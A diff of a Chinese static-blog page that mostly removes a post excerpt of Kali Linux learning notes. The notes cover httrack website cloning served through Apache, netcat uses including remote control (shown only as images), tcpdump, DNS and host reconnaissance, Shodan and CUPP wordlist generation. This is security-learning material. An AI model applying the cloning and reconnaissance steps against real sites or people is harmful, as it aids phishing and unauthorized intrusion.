-<h2 id="2-脚本格式"><a href="#2-脚本格式" class="headerlink" title="2. 脚本格式"></a>2. 脚本格式</h2><p>if条件语句：使用<code>中括号[]</code>存放判断，以<code>分号;</code>结尾</p>
-<p><code>if -&gt; 条件 -&gt; then -&gt; 执行体 -&gt; fi</code>作为一个完整的条件执行</p>
-<p><code>(seq 1 100)</code>：从1到100逐个打印</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Kali%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2-1.png" alt="2-1"></p>
-<h2 id="3-克隆网站"><a href="#3-克隆网站" class="headerlink" title="3. 克隆网站"></a>3. 克隆网站</h2><p>工具：<code>httrack</code></p>
-<p>可以直接复制目标网站，并存放在默认目录<code>/root/website</code>下</p>
-<p>将克隆好的网站文件，复制到<code>/var/www/html</code>下，使用命令<code>/etc/init.d/apache2 start</code>启动apache服务就可以访问了</p>
-<h2 id="4-NetCat"><a href="#4-NetCat" class="headerlink" title="4. NetCat"></a>4. NetCat</h2><p>网络安全工具中的瑞士军刀</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Kali%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/4-1.png" alt="4-1"></p>
-<p><strong>聊天</strong></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Kali%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/4-2.png" alt="4-2"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Kali%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/4-3.png" alt="4-3"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Kali%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/4-4.png" alt="4-4"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Kali%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/4-5.png" alt="4-5"></p>
-<p><strong>传输文件</strong></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Kali%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/4-6.png" alt="4-6"></p>
-<p><strong>播放视频</strong></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Kali%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/4-7.png" alt="4-7"></p>
-<p><strong>端口扫描</strong></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Kali%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/4-8.png" alt="4-8"></p>
-<p><strong>远程克隆磁盘</strong></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Kali%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/4-9.png" alt="4-9"></p>
-<p><strong>远程控制</strong></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Kali%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/4-10.png" alt="4-10"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Kali%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/4-11.png" alt="4-11"></p>
-<p><strong>NC的安全传输NCAT</strong></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Kali%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/4-12.png" alt="4-12"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Kali%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/4-13.png" alt="4-13"></p>
-<h2 id="5-Tcpdump"><a href="#5-Tcpdump" class="headerlink" title="5. Tcpdump"></a>5. Tcpdump</h2><p>没有GUI界面的抓包工具</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Kali%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/5-1.png" alt="5-1"></p>
-<p><strong>使用</strong></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Kali%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/5-2.png" alt="5-2"></p>
-<p>-i  选取网卡；-s  选取字节,0表示无限大；-w  表示内容保存为文件的名字</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Kali%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/5-3.png" alt="5-3"></p>
-<p><strong>筛选</strong></p>
-<p>-n  表示不对IP域名进行解析，直接显示IP；-r  表示读取文件内容，最初的截图有；src host  筛选源IP地址（dst host  筛选目的地址）；-X  以十六进制形式显示</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Kali%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/5-4.png" alt="5-4"></p>
-<h2 id="6-DNS信息收集"><a href="#6-DNS信息收集" class="headerlink" title="6. DNS信息收集"></a>6. DNS信息收集</h2><p><strong>域名解析</strong></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Kali%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/6-1.png" alt="6-1"></p>
-<p>FQDN：<a href="http://www.sina.com" target="_blank" rel="noopener">www.sina.com</a></p>
-<p>A类：直接映射出IP地址</p>
-<p>NS类：一对多的关系，如sina.com.对应ns1.sina.com.和ns3.sina.com.等等</p>
-<p>MX类：邮件服务器</p>
-<p>ptr：方向解析域名（用IP地址解析出域名）</p>
-<p><strong>Nslookup（域名解析）</strong></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Kali%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/6-2.png" alt="6-2"></p>
-<p><strong>Dig</strong></p>
-<p>@：后面加自己想要借用的DNS服务器如114.114.114.114</p>
-<p>+noall：并不是全部信息，因为有的没用</p>
-<p>+answer：与+noall一起使用，只显示answer部分</p>
-<p>-x:表示反向查询</p>
-<p>Bind版本查询命令：@后面加的是NS域名服务器</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Kali%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/6-3.png" alt="6-3"></p>
-<p><strong>域名注册留下的信息查询（使用Whois）</strong></p>
-<p>域名注册可能会留下组织，电话什么的（提醒注册域名时，使用代理商的电话信息什么的，不要留下自己的信息）</p>
-<p>例如：whois sina.com</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Kali%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/6-4.png" alt="6-4"></p>
-<h2 id="7-二层发现"><a href="#7-二层发现" class="headerlink" title="7. 二层发现"></a>7. 二层发现</h2><p><strong>arping</strong></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Kali%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/7-1.png" alt="7-1"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Kali%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/7-2.png" alt="7-2"></p>
-<p><strong>Nmap</strong></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Kali%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/7-3.png" alt="7-3"></p>
-<p><strong>Netdiscover</strong></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Kali%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/7-4.png" alt="7-4"></p>
-<p><strong>Scapy</strong></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Kali%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/7-5.png" alt="7-5"></p>
-<h2 id="8-三层发现"><a href="#8-三层发现" class="headerlink" title="8. 三层发现"></a>8. 三层发现</h2><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Kali%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/8-1.png" alt="8-1"></p>
-<p><strong>Ping</strong></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Kali%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/8-2.png" alt="8-2"></p>
-<p><strong>Scapy</strong></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Kali%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/8-3.png" alt="8-3"></p>
-<p><strong>fping</strong></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Kali%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/8-8.png" alt="8-8"></p>
-<p><strong>hping3</strong></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Kali%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/8-9.png" alt="8-9"></p>
-<h2 id="9-搜索引擎"><a href="#9-搜索引擎" class="headerlink" title="9. 搜索引擎"></a>9. 搜索引擎</h2><p><strong>RECON-NG</strong>（命令行）、<strong>Shodan</strong>（网站）、<strong>Google</strong></p>
-<h2 id="10-其他工具"><a href="#10-其他工具" class="headerlink" title="10. 其他工具"></a>10. 其他工具</h2><p><strong>CUPP</strong>（生成社工字典）、<strong>exiftool</strong>（图片属性浏览）</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">基础知识点</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/03/15/Kali学习笔记/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/Knlvre.github-io/">&laquo; Prev</a><a class="page-number" href="/Knlvre.github-io/">1</a><span class="page-number current">2</span><a class="page-number" href="/Knlvre.github-io/page/3/">3</a><a class="page-number" href="/Knlvre.github-io/page/4/">4</a><a class="page-number" href="/Knlvre.github-io/page/5/">5</a><a class="extend next" rel="next" href="/Knlvre.github-io/page/3/">Next &raquo;</a>
+      <a class="extend prev" rel="prev" href="/Knlvre.github-io/">&laquo; Prev</a><a class="page-number" href="/Knlvre.github-io/">1</a><span class="page-number current">2</span><a class="page-number" href="/Knlvre.github-io/page/3/">3</a><a class="page-number" href="/Knlvre.github-io/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/Knlvre.github-io/page/6/">6</a><a class="extend next" rel="next" href="/Knlvre.github-io/page/3/">Next &raquo;</a>
     </nav>
   
 
@@ -2068,6 +2004,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">渗透测试</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">DVWA</a>
               </li>
              
@@ -2081,10 +2021,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">博客搭建</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">渗透测试</a>
               </li>
             
             <div class="clearfix"></div>
